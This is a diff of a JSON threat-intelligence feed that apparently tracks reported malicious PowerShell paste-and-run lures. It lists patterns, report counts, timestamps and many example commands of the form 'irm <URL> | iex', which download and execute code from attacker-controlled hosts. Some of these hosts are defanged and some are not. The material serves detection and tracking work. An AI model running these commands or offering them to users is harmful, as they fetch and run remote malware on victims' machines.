@@ -1,15 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 147,
-    "ReportCount": 147,
-    "FirstSeen": "2026-11-10T16:02:40.674000+00:00",
-    "LastSeen": "2026-11-17T14:55:43.108000+00:00",
+    "DistinctPayloadCount": 144,
+    "ReportCount": 144,
+    "FirstSeen": "2026-11-10T16:32:33.446000+00:00",
+    "LastSeen": "2026-11-17T16:27:14.726000+00:00",
     "ReportIds": [
-      "cmwavpfda058j0omlaap4heeo",
-      "cmwavxxeu05bp0omlgbq1bj3q",
-      "cmwaw0ua500140oml8e35yh3p",
-      "cmwaw31sa00280oml1t9y7hw8",
       "cmwawrukx00c80omliy9fxkyr",
       "cmwax209w00lg0oml25avrawp",
       "cmwb12w7t00dj0nmlk3hyfwh0",
@@ -152,7 +148,8 @@
       "cmwkjd2jz1eum0omljaktuag7",
       "cmwkjm84z1f0v0omlbp0to0sq",
       "cmwkjnyfa1f270oml6e7m8b2g",
-      "cmwkte9y71fs10omlyn3mr6rc"
+      "cmwkte9y71fs10omlyn3mr6rc",
+      "cmwkwnzbj1gia0oml0nx35ejg"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -215,6 +212,7 @@
       "irm 'browse-cloud.codes/c5621fb7f3b4133b'|iex;",
       "irm 'browse-cloud.codes/c59b6384f87c88f2'|iex;",
       "irm 'browse-cloud.codes/c8ca95eaeac086b6'|iex;",
+      "irm 'browse-cloud.codes/caf5b9a1f5f14017'|iex;",
       "irm 'browse-cloud.codes/ced7a9afa43f4429'|iex;",
       "irm 'browse-cloud.codes/d672b0f95721a987'|iex;",
       "irm 'browse-cloud.codes/da9e95e67701632a'|iex;",
@@ -246,7 +244,6 @@
       "irm 'browse-nnccodes.beer/0bb98601c2aaf567'|iex;",
       "irm 'browse-nnccodes.beer/0e479f5349efdb6d'|iex;",
       "irm 'browse-nnccodes.beer/174623c0f642d3eb'|iex;",
-      "irm 'browse-nnccodes.beer/174c5db552b2a148'|iex;",
       "irm 'browse-nnccodes.beer/189b1694d7e41576'|iex;",
       "irm 'browse-nnccodes.beer/19c2acc42ea61be2'|iex;",
       "irm 'browse-nnccodes.beer/1ce85935d5e8d060'|iex;",
@@ -267,10 +264,8 @@
       "irm 'browse-nnccodes.beer/44735eefdb1d4abd'|iex;",
       "irm 'browse-nnccodes.beer/44f5c1c159276caa'|iex;",
       "irm 'browse-nnccodes.beer/4ebcfb3eddea4f02'|iex;",
-      "irm 'browse-nnccodes.beer/5955e0d1f05713da'|iex;",
       "irm 'browse-nnccodes.beer/69845b449b7231eb'|iex;",
       "irm 'browse-nnccodes.beer/6c23bd6dae0e89ab'|iex;",
-      "irm 'browse-nnccodes.beer/76b91ffc402d74f1'|iex;",
       "irm 'browse-nnccodes.beer/77ec859b6ca732cb'|iex;",
       "irm 'browse-nnccodes.beer/7ffbfcfa0fdc9160'|iex;",
       "irm 'browse-nnccodes.beer/84be581882fb11c6'|iex;",
@@ -289,7 +284,6 @@
       "irm 'browse-nnccodes.beer/c7b605b31ca2f950'|iex;",
       "irm 'browse-nnccodes.beer/ccee3ed87c8109ea'|iex;",
       "irm 'browse-nnccodes.beer/cd7f076054b8a4ce'|iex;",
-      "irm 'browse-nnccodes.beer/ce33608b964ca885'|iex;",
       "irm 'browse-nnccodes.beer/cefc867900442c97'|iex;",
       "irm 'browse-nnccodes.beer/d230586231576f76'|iex;",
       "irm 'browse-nnccodes.beer/d6635ac514ec3dc5'|iex;",
@@ -427,10 +421,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 40,
-    "ReportCount": 40,
+    "DistinctPayloadCount": 43,
+    "ReportCount": 43,
     "FirstSeen": "2026-11-10T21:20:06.377000+00:00",
-    "LastSeen": "2026-11-17T15:48:38.351000+00:00",
+    "LastSeen": "2026-11-17T16:27:36.918000+00:00",
     "ReportIds": [
       "cmwb71nav01nq0nmlm04mhxot",
       "cmwb7gg5t01t90nmlz5690sam",
@@ -471,7 +465,10 @@
       "cmwkmw17h1f990oml8ubw5izj",
       "cmwkmw4kx1f9x0omlu6etnpyg",
       "cmwkp8vhm1fhu0omljubkjak1",
-      "cmwkvabz41g3d0omlam9kifpb"
+      "cmwkvabz41g3d0omlam9kifpb",
+      "cmwkwna3t1ggu0omlkh46m4jy",
+      "cmwkwncld1gh40omlgi2ci092",
+      "cmwkwogiy1gj50oml7s1qykid"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -504,6 +501,9 @@
       "(irm 'https://github[.]pw/wp/4ff6ecee35528485')|iex",
       "(irm 'https://github[.]pw/wp/a99138664d16b6b2')|iex",
       "(irm 'https://github[.]pw/wp/e9e0a4eb0e5a4b04')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/10e3132beb43e46a')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/55bbcc0972a7f52e')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/96f5354b102ae253')|iex",
       "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
       "(irm 'https://t-trustresnew[.]com/Girya/3a8b7746765169c8')|iex",
       "(irm 'https://t-trustresnew[.]com/click/9984f7622e099be9')|iex",
@@ -518,14 +518,11 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 13,
-    "ReportCount": 134,
-    "FirstSeen": "2026-11-10T16:11:23.111000+00:00",
-    "LastSeen": "2026-11-17T15:49:43.918000+00:00",
+    "DistinctPayloadCount": 14,
+    "ReportCount": 136,
+    "FirstSeen": "2026-11-10T16:36:37.913000+00:00",
+    "LastSeen": "2026-11-17T16:27:52.213000+00:00",
     "ReportIds": [
-      "cmwaw0me9000g0omlvok9weut",
-      "cmwawij39007h0omls43cjle7",
-      "cmwawqbdd00aw0oml6ie6cyr9",
       "cmwawx39b00f90omlhj73t2rd",
       "cmwawy94v00gz0omlc6uxuw2c",
       "cmwax1e7400k10omly5mt7cgu",
@@ -656,7 +653,12 @@
       "cmwks1j5h1fne0omlmmivmcx4",
       "cmwktvio01fxo0omlc5hd3w8p",
       "cmwkv9kms1g1g0omljms1lzaw",
-      "cmwkvbqmg1g470omltoxx8l7x"
+      "cmwkvbqmg1g470omltoxx8l7x",
+      "cmwkvpwlq1g8i0omlnx9yaren",
+      "cmwkvpzsj1g9w0omldxy4pqzo",
+      "cmwkvr0wy1gbq0oml11odrf3k",
+      "cmwkw78tg1ger0omll3675aoe",
+      "cmwkwos8m1gkp0omlt4yakzjb"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -669,6 +671,7 @@
       "IRM gitlab[.]com/amber-ffa-f15a6b/9e0-4c42-afe7-251068acb178/-/raw/main/abc7-8d4949018f38 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/b788-40ef-9a42-abc325898912/-/raw/main/9fd-a6c523a5e801 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/c5fa-4bda-b3e2-5f9c4914c525/-/raw/main/9be-4304-aca5-58755806e515 | IEX",
+      "IRM gitlab[.]com/cc4b6f224188/4495be-a229-4a88-ab68-d0b50dfe86b4/-/raw/main/E53-a76F-3c3D6f99 | IEX",
       "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
       "IRM gitlab[.]com/nova-84e1-18b2b/dfe3a696-c14d-4630-a92d-8abd34181696/-/raw/main/b71c-f53787076F8f | IEX",
       "IRM gitlab[.]com/wiktor1992/5a7-c750-4e63-a8ef-b47c51850b86/-/raw/main/322-8a5e-1c6ee27902bd | IEX"
